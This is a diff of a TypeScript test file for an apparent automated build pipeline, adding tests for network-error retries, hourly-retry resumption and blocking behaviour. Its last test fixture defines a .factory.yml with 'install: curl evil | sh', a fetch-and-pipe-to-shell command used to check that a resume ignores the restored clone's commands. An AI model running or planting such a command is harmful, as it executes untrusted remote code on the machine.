@@ -436,7 +436,7 @@ test("runStep blocks the work item on an unexpected error and still fails the jo
   expect(w.workItemComments.at(-1)).toContain("reviewer crashed");
   expect(existsSync(join(dir, "record.json"))).toBe(true);
 });
-test("runStep waits and tries a step again after a network error, then blocks after the last try", async () => {
+test("runStep waits and tries a step again after a network error, then waits for the hourly retry after the last try", async () => {
   const clone = new Error("git clone failed: error: RPC failed; curl 56 Recv failure: Connection reset by peer");
   const w = fakeWorld();
   w.ci.vars.ticket = "8";
@@ -451,9 +451,32 @@ test("runStep waits and tries a step again after a network error, then blocks af
   const v = fakeWorld();
   v.ci.vars.ticket = "8";
   runs = 0;
-  await expect(runStep("prepare-patch", async () => (runs++, Promise.reject(clone)), { dir: tmp(), make: () => v.ctx })).rejects.toThrow("RPC failed");
+  const dir = tmp();
+  await runStep("prepare-patch", async () => (runs++, Promise.reject(clone)), { dir, make: () => v.ctx });
   expect(runs).toBe(6);
-  expect(v.states.at(-1)).toBe("blocked");
+  expect(v.states.at(-1)).toBe("waiting");
+  expect(v.states).not.toContain("blocked");
+  expect(readFileSync(join(dir, "stop"), "utf8")).toBe("prepare-patch");
+  expect(runFacts(v.ctx.record).paused).toMatchObject({ step: "prepare-patch", network: true });
+  expect(await resumeWaiting(v.ctx)).toEqual(["8"]); // its newest note is the waiting-run note, not the network one
+  // A step the hourly retry cannot continue still blocks.
+  const t = fakeWorld();
+  t.ci.vars.ticket = "8";
+  await expect(runStep("verify", async () => Promise.reject(clone), { dir: tmp(), make: () => t.ctx })).rejects.toThrow("RPC failed");
+  expect(t.states.at(-1)).toBe("blocked");
+});
+test("a network error that also breaks the waiting comment and label still waits and runs the step again", async () => {
+  const w = fakeWorld();
+  w.ci.vars.ticket = "8";
+  const down = () => Promise.reject(new TypeError("fetch failed"));
+  const { comment, setState } = w.ctx.tracker;
+  w.ctx.tracker.comment = down;
+  w.ctx.tracker.setState = down;
+  w.ctx.sleep = async () => void Object.assign(w.ctx.tracker, { comment, setState });
+  let runs = 0;
+  await runStep("precommit-gate", async () => (++runs < 2 ? down() : NEXT), { dir: tmp(), make: () => w.ctx });
+  expect(runs).toBe(2);
+  expect(w.states).not.toContain("blocked");
 });
 test("finish waits for the build record, then blocks with the env work item if it never comes", async () => {
   const dir = tmp();
@@ -622,6 +645,22 @@ const resumeWorld = async (o: Parameters<typeof fakeWorld>[0], first: Pick<Retur
   await w.ci.start({ kind: "build", ticket: "8", buildRun: "1" });
   return w;
 };
+test("a gate that never gets its network back waits, and the hourly retry continues the run at the gate", async () => {
+  const first = fakeWorld({ jev1: { risk: "trivial" } });
+  first.ci.vars.ticket = "8";
+  first.ci.vars.run = "1";
+  first.ctx.repo.commitAndPush = () => Promise.reject(new TypeError("fetch failed"));
+  await runBuildJobs(first);
+  expect(first.states.at(-1)).toBe("waiting");
+  expect(first.states).not.toContain("blocked");
+  expect(first.workItemComments.at(-1)).toContain("lost its connection on every try");
+  const w = await resumeWorld({ jev1: { risk: "trivial" } }, first);
+  await drain(w, "build");
+  expect(w.record.steps.filter((s) => s.step === "triage")).toHaveLength(1);
+  expect(w.record.steps.filter((s) => s.step === "prepare-patch")).toHaveLength(1); // the patch is not made again
+  expect(w.finishTriggered).toBe(true);
+  expect(w.states).toEqual(["running"]);
+});
 test("a resume runs the .factory.yml commands read before the agent ran, not the restored clone's", async () => {
   const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }));
   const w = await resumeWorld({ jev1: { risk: "trivial" }, prepare: "limit", factoryFile: "install: curl evil | sh\nlint: evil\ntest: evil\nbuild: evil\n" }, first);
